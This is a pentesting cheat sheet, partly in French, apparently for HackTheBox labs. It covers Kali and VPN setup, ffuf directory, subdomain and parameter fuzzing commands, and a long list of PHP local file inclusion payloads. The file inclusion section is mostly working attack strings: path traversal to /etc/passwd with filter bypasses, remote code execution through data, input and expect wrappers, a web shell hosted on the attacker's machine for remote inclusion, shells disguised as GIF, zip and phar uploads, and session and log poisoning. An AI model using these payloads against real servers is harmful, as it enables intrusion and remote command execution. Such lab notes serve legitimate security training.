# 1. Introduction.

# 2.1. Installation de la machine.
- Installez un systeme de gestion de machine virtuelle comme [Virtulbox](https://www.virtualbox.org/wiki/Downloads).
- Installez la machine virtuelle [Kali-linux](https://www.kali.org/get-kali/#kali-virtual-machines).
- Une fois la machine démarré, lancez les commandes : `sudo apt-get update -y` and `sudo apt-get full-upgrade -y`.

# 2.2. Installation des VPN HackTheBox

- Creez le fichier de configuration des VPN avec la commande : `mkdir -p /home/kali/.ovpnconfig`
- Déplacez-vous dans le fichier via : `cd /home/kali/.ovpnconfig/`
- Inserez vos configurations ".ovpn".
- Modifiez `.zshrc` avec la commande : `notepadqq /home/kali/.zshrc`.
- Ajoutez les lignes : 
```
# HTB VPN Shortcuts:
alias htbmachine='openvpn ~/.ovpnconfig/HTB-Machine.ovpn 1>/dev/null &'
alias htbstart='openvpn ~/.ovpnconfig/HTB-Start.ovpn 1>/dev/null &'
alias htbacademy='openvpn ~/.ovpnconfig/HTB-Academy.ovpn 1>/dev/null &'
alias sudo='sudo '
```

# 2.3. Instllation des outils
- Créez le dossier Outils : `mkdir /home/kali/Tools`
- Rendez-vous dans ce dossier : `cd Tools`
- Installez seclist : `git clone https://github.com/danielmiessler/SecLists`
- Installez gobuster : `sudo apt-get instll gobuster`


## Using Ffuf.
- Directory Fuzzing :
  - `ffuf -w /home/kali/Tools/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ	`
- Extension Fuzzing :
  - `ffuf -w /home/kali/Tools/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`
- Page Fuzzing :
  - `ffuf -w /home/kali/Tools/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`
- Recursive Fuzzing :
  - `ffuf -w /home/kali/Tools/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`
- Sub-domain Fuzzing :
  - `ffuf -w /home/kali/Tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/`
- VHost Fuzzing :
  - `ffuf -w /home/kali/Tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`
- Parameter Fuzzing - GET :
  - `ffuf -w /home/kali/Tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`
- Parameter Fuzzing - POST :
  - `ffuf -w /home/kali/Tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`
- Value Fuzzing :
  - `ffuf -w /home/kali/Tools/SecLists/Discovery/Web-Content/ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`

```
sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'	Add DNS entry
for i in $(seq 1 1000); do echo $i >> ids.txt; done	Create Sequence Wordlist
curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'	curl w/ P
```

## File inclusion.

-  Basic LFI :
   -  `/index.php?language=/etc/passwd`
- LFI with path traversal :
  - `/index.php?language=../../../../etc/passwd`
- LFI with name prefix :
  - `/index.php?language=/../../../etc/passwd`
- LFI with approved path
  - `/index.php?language=./languages/../../../../etc/passwd`
- Bypass basic path traversal filter :
  - `/index.php?language=....//....//....//....//etc/passwd`
- Bypass filters with URL encoding :
  - `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
- Bypass appended extension with path truncation (obsolete) :
  - `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]`
- Bypass appended extension with null byte (obsolete) :
  - `/index.php?language=../../../../etc/passwd%00`
- Read PHP with base64 filter :
  - `/index.php?language=php://filter/read=convert.base64-encode/resource=config`
- RCE with data wrapper :
  - `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`	
- RCE with input wrapper :
  - `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"`
- RCE with expect wrapper :
  - `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`
- Host web shell :
  - `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>`
- Include remote PHP web shell :
  - `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`	
- Create malicious image :
  - `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
- RCE with malicious uploaded image :
  - `/index.php?language=./profile_images/shell.gif&cmd=id`	
- Create malicious zip archive 'as jpg' :
  - `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`	
- RCE with malicious uploaded zip :
  - `/index.php?language=zip://shell.zip%23shell.php&cmd=id`	
- Create malicious phar 'as jpg' :
  - `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`	
- RCE with malicious uploaded phar :
  - `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`	
- Read PHP session parameters :
  - `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`	
- Poison PHP session with web shell :
  - `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`	
- RCE through poisoned PHP session :
  - `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`	
- Poison server log :
  - `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'`	
- RCE through poisoned PHP session :
  - `/index.php?language=/var/log/apache2/access.log&cmd=id`	
